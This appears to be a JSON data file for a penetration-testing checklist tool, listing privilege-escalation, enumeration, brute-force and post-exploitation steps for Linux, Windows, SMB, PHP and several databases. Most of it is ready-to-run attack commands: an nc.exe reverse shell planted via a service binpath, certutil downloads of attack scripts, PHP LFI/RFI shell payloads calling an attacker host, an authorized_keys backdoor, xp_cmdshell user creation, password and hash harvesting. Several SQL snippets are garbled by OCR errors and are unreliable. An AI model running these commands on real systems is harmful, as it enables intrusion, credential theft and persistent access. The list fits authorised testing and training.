[
  {
    "name": "EscalationLinux",
    "items": [
      {
        "entry": "Find linux distribution, version architecture:",
        "steps": [
          "cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;",
          "cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run the built-in checklists and manual (https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Look for SUID and GUID bit set:",
        "steps": [
          "find / -perm -u=s -type f 2>/dev/null",
          "find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \\; 2>/dev/null",
          "find / -perm -1000 -type d 2>/dev/null",
          "find / -perm -g=s -type f 2>/dev/null"
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "EscalationWindows",
    "items": [
      {
        "entry": "Information gathering:",
        "steps": [
          "# Basics",
          "systeminfo",
          "hostname",
          "wmic qfe get Caption,Description,HotFixID,InstalledOn",
          "",
          "# Who am I?",
          "whoami",
          "echo %username%",
          "",
          "# What users/localgroups are on the machine?",
          "net users",
          "net localgroups",
          "",
          "# More info about a specific user. Check if user has privileges.",
          "net user user1",
          "",
          "# View Domain Groups",
          "net group /domain",
          "",
          "# View Members of Domain Group",
          "net group /domain <Group Name>",
          "",
          "# Firewall",
          "netsh firewall show state",
          "netsh firewall show config",
          "",
          "# Network",
          "ipconfig /all",
          "route print",
          "arp -A",
          "",
          "# How well patched is the system?",
          "wmic qfe get Caption,Description,HotFixID,InstalledOn",
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for weak permissions on processes running",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Try and run the local enumeration python script",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Other scripts (These are already downloaded):",
        "steps": [
          "Start HTTP server in 'Scripts/win'",
          "Powerless.bat: A Windows privilege escalation (enumeration) script designed with OSCP labs.",
          "Windows-Exploit-Suggester: This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target.",
          "SessionGopher: SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop.",
          "JAWS: JAWS is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems.",
          "windows-privesc-check: Windows-privesc-check is standalone executable that runs on Windows systems.",
          "Sherlock: PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.",
          "PowerUp: PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."
        ],
        "codeBlock": "certutil.exe -urlcache -split -f \"http://$IP/Powerless.bat\" Powerless.bat\r\ncertutil.exe -urlcache -split -f \"http://$IP/windows-exploit-suggester.py\" windows-exploit-suggester.py\r\ncertutil.exe -urlcache -split -f \"http://$IP/SessionGopher.ps1\" SessionGopher.ps1\r\ncertutil.exe -urlcache -split -f \"http://$IP/jaws-enum.ps1\" jaws-enum.ps1\r\ncertutil.exe -urlcache -split -f \"http://$IP/windows_privesc_check.py\" windows_privesc_check.py\r\nhttps://github.com/pentestmonkey/windows-privesc-check\r\ncertutil.exe -urlcache -split -f \"http://$IP/Sherlock.ps1\" Sherlock.ps1\r\ncertutil.exe -urlcache -split -f \"http://$IP/PowerUp.ps1\" PowerUp.ps1"
      },
      {
        "entry": "Cleartext Passwords:",
        "steps": [
          "findstr /si password *.txt",
          "findstr /si password *.xml",
          "findstr /si password *.ini",
          "",
          "#Find all those strings in config files.",
          "dir /s *pass* == *cred* == *vnc* == *.config*",
          "",
          "# Find all passwords in all files.",
          "findstr /spin \"password\" *.*",
          "findstr /spin \"password\" *.*",
          "",
          "c:\\sysprep.inf",
          "c:\\sysprep\\sysprep.xml",
          "c:\\unattend.xml",
          "%WINDIR%\\Panther\\Unattend\\Unattended.xml",
          "%WINDIR%\\Panther\\Unattended.xml",
          "",
          "dir c:\\*vnc.ini /s /b",
          "dir c:\\*ultravnc.ini /s /b ",
          "dir c:\\ /s /b | findstr /si *vnc.ini",
          "",
          "# VNC",
          "reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"",
          "",
          "# Windows autologin",
          "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"",
          "",
          "# SNMP Paramters",
          "reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"",
          "",
          "# Putty",
          "reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"",
          "",
          "# Search for password in registry",
          "reg query HKLM /f password /t REG_SZ /s",
          "reg query HKCU /f password /t REG_SZ /s"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Change the upnp service binary (XP):",
        "steps": [
          "sc config upnphost binpath= \"C:\\Inetpub\\nc.exe 192.168.1.101 6666 -e c:\\Windows\\system32\\cmd.exe\"",
          "sc config upnphost obj= \".\\LocalSystem\" password= \"\"",
          "sc config upnphost depend= \"\"",
          "",
          "https://www.fuzzysecurity.com/tutorials/16.html",
          "Windows Enumeration_fuzzy.pdf"
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "FileTransfer",
    "items": [
      {
        "entry": "Some options:",
        "steps": [
          "python -m SimpleHTTPServer 80",
          "python3 -m http.server 80",
          "python -m pyftpdlib -p 21",
          "python3 -m pyftpdlib -p 21",
          "meterpreter > upload some_file c:\\",
          "(Start TFTP server) (put stuff in /srv/tftp) atftpd --daemon --port 69 /tftp; /etc/init.d/atftpd restart"
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "MySql",
    "items": [
      {
        "entry": "Check for default usernames and passwords.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for same username and password.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for blank password.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run bruteforce",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Standard enumeration commands:",
        "steps": [
          ""
        ],
        "codeBlock": "SELECT @@version; /* DB version */ \r\nSELECT @@hostname; /* Hostname & IP */\r\nSELECT database(); /* Current DB */\r\nSELECT distinct (db) FROl1 mjsql.db; /* List DBs */\r\nSELECT user(); /* Current user */\r\nSELECT user FROM mJsql.user; /* List users */ \r\nSELECT host,user,password FROM mJsql.user; /* List password hashes */"
      },
      {
        "entry": "List all tables and columns:",
        "steps": [
          ""
        ],
        "codeBlock": "SELECT table schema, table name, column_ name FROM\r\n  information scherna.columns WHERE\r\n  table schema != 'rnysql' AND table schema != 'information schema'"
      },
      {
        "entry": "Execute OS commands:",
        "steps": [
          "osql -S ip, port -U sa -P pwd -Q \"exec xp cmdshell 'net user /add user pass'\""
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "NetworkScan",
    "items": [
      {
        "entry": "Initial Scan",
        "steps": [
          "Start a version scan in Nmap in Zenmap (nmap -sV 10.0.0.0-100) be sure to save the results"
        ],
        "codeBlock": "nmap -sV 10.0.0.0-100"
      },
      {
        "entry": "Use Masscan, and Sparta to get a second scan",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Use Nmap, and Sparta and do a slow, stealthly thrid scan, and be sure to get every port.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Find all HTTP servers and run the big 4 scanners on them (Nikto, Nessus, Nexpose, OpenVAS)",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Do a full TCP/UDP slow and silent scan on each machine. (should take about a week)'",
        "steps": [
          ""
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "NotableExploits",
    "items": [
      {
        "entry": "Linux Kernel <= 2.6.36-rc8",
        "steps": [
          "CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8: https://www.exploit-db.com/exploits/15285/"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Linux Kernel <= 2.6.37",
        "steps": [
          "Linux Kernel <= 2.6.37 'Full-Nelson.c': https://www.exploit-db.com/exploits/15704/"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Linux Kernel 2.6.39 < 3.2.2",
        "steps": [
          "CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)",
          "https://git.zx2c4.com/CVE-2012-0056/about"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Linux kernel < 3.2.2",
        "steps": [
          "Linux CVE 2012-0056: wget -O exploit.c <http://www.exploit-db.com/download/18411"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Linux Kernel <= 3.19.0-73.8",
        "steps": [
          "CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8: https://dirtycow.ninja"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Linux 2.6.32",
        "steps": [
          "Linux 2.6.32: https://www.exploit-db.com/exploits/15285"
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "Oracle DB",
    "items": [
      {
        "entry": "Check for default usernames and passwords",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for same username and password",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for blank password",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run bruteforce",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Standard enumeration commands:",
        "steps": [
          ""
        ],
        "codeBlock": "SELECT * FROM v$version; /* DB version */' + \\\r\nSELECT version FROM v$instance; /* DB version */' + \\\r\nSELECT instance name FROM v$instance; /*   */\r\nSELECT name FROM $database; /* Current DB */\r\nSELECT DISTINCT owner FROM all tables; /* List DBs */\r\nSELECT user FROM dual; /* Current user */\r\nSELECT username FROM all users ORDER BY username; /* List users */\r\nSELECT column name FROM all tab columns; /* List columns */\r\nSELECT name, -password, astatus FROt1 SJS.user$; /* List password hashes */"
      }
    ]
  },
  {
    "name": "PHP",
    "items": [
      {
        "entry": "What you can do with LFI:",
        "steps": [
          "Get source files including the config.php file.",
          "index.php?file=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>"
        ],
        "codeBlock": ""
      },
      {
        "entry": "What you can do with RFI:",
        "steps": [
          "Can get a shell: php?page=http://ATTACHER_IP:8000/shell.php%00",
          "php://filter/resource=http://www.example.com"
        ],
        "codeBlock": ""
      },
      {
        "entry": "PHP ZIP Wrapper LFI:",
        "steps": [
          "Create a PHP reverse shell",
          "Compress to a .zip file",
          "Upload the compressed shell payload to the server",
          "Use the zip wrapper to extract the payload using: php?page=zip://path/to/file.zip%23shell",
          "The above will extract the zip file to shell, if the server does not append .php rename it to shell.php instead"
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "Postgres Server",
    "items": [
      {
        "entry": "Check for default usernames and passwords",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for same username and password",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for blank password",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run bruteforce",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Standard enumeration commands:",
        "steps": [
          ""
        ],
        "codeBlock": "'SELECT version();\r\nSELECT inet server_addr();\r\nSELECT current database();\r\nSELECT datname FROM pg database;\r\nSELECT user;\r\nSELECT username FROM pg_user;\r\nSELECT username,passwd FROM pg shadow;"
      },
      {
        "entry": "List Tables:",
        "steps": [
          ""
        ],
        "codeBlock": "SELECT c.relname FROM pg_catalog.pg_class c\r\n  LEFT JOIN pg catalog.pg namespace n ON n.old = c.relnamespace \r\n  WHERE c.relkind IN ( 'r','') AND n.nspnarne NOT IN ('pg catalog', 'pg toast')\r\n  AND pg catalog.pg table is visible(c.oid)"
      }
    ]
  },
  {
    "name": "RootedLinux",
    "items": [
      {
        "entry": "Grab the shadow file for cracking later.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Grab the proof.txt file in the /root dir.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check network interfaces for what networks it is connected to:",
        "steps": [
          "/sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf;",
          "/sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf;"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Remember you might need to use this to pivot.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run sniffer to see what operations are going on.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Add public key to authorized keys:",
        "steps": [
          "echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Use netstat to find other machines connected: netstat -ano",
        "steps": [
          ""
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "RootedWindows",
    "items": [
      {
        "entry": "Grab hashes for cracking later:",
        "steps": [
          "Victim recieves file: nc -l -p 1234 > fgdump.exe",
          "Send fgdump: nc -w 3 [IP] 1234 < fgdump.exe"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Use wce.exe -w to extract any passwords in memory.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Grab the C:\\Users\\Administrator\\Desktop\\proof.txt file in the desktop dir.",
        "steps": [
          "",
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check network interfaces for what networks it is connected to.",
        "steps": [
          "",
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Remember you might need to use this to pivot.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run sniffer to see what operations are going on.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run Get-GPPPassword from Powersploit to get group.xml encrypted passwords.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Use netstat to find other machines connected: netstat -ano",
        "steps": [
          ""
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "SMB",
    "items": [
      {
        "entry": "Enumerate",
        "steps": [
          "enum4linux -a  ${target}",
          "NmapSmbEnum custom command"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Null session check",
        "steps": [
          "Null session check (smbclient -I  ${target}  -L PC_NAME -N -U)",
          "Investigate shares (smbclient //PC_NAME/SHARE -I  ${target} )",
          "Check for NULL user RPC commands (rpcclient -U \"\"  ${target} )"
        ],
        "codeBlock": ""
      },
      {
        "entry": "NetBIOS over TCP/IP client used to lookup NetBIOS names",
        "steps": [
          "nmblookup -A  ${target} ",
          "nbtscan -r 10.11.1.0/24"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for MS08-067",
        "steps": [
          "nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=${target} "
        ],
        "codeBlock": ""
      },
      {
        "entry": "Vulnerability Scanning",
        "steps": [
          "NmapSmbVuln custom command"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Bruteforce",
        "steps": [
          "hydra -L ${user_file} -P ${pass_file} ${target} smb",
          "Nmap smb-brute.nse",
          "ncrack –U ${user_file} -P ${pass_file} ${target} –p 445",
          "medusa -h ${target} -U ${user_file} -P ${pass_file} -M smbnt"
        ],
        "codeBlock": "\\tmsf> use auxiliary/scanner/smb/smb_login\r\n\\tmsf exploit (smb_login)>set rhosts 192.168.1.118\r\n\\tmsf exploit (smb_login)>set user_file /root/Desktop/user.txt\r\n\\tmsf exploit (smb_login)>set pass_file /root/Desktop/pass.txt\r\n\\tmsf exploit (smb_login)>set stop_on_success true\r\n\\tmsf exploit (smb_login)>exploit"
      }
    ]
  },
  {
    "name": "SQL Server",
    "items": [
      {
        "entry": "Check for default usernames and passwords",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for same username and password",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for blank password",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run bruteforce",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Standard enumeration commands:",
        "steps": [
          ""
        ],
        "codeBlock": "SELECT @@version' + \\\r\nEXEC xp_msver' + \\\r\nEXEC master .. xp_cmdshell \\'net user\\'' + \\\r\nSELECT HOST_ NAME()\r\nSELECT DB_ NAME()\r\nSELECT name FROM master .. sysdatabases;\r\nSELECT name FROM master .. syslogins\r\nSELECT name FROM master .. sysobjects WHERE Xtype= 'U'\r\nSELECT name FROM SyScolumns WHERE id=(SELECT id FROM sysobjects WHERE name='mytable' )\r\nSELECT user_name()"
      }
    ]
  }
]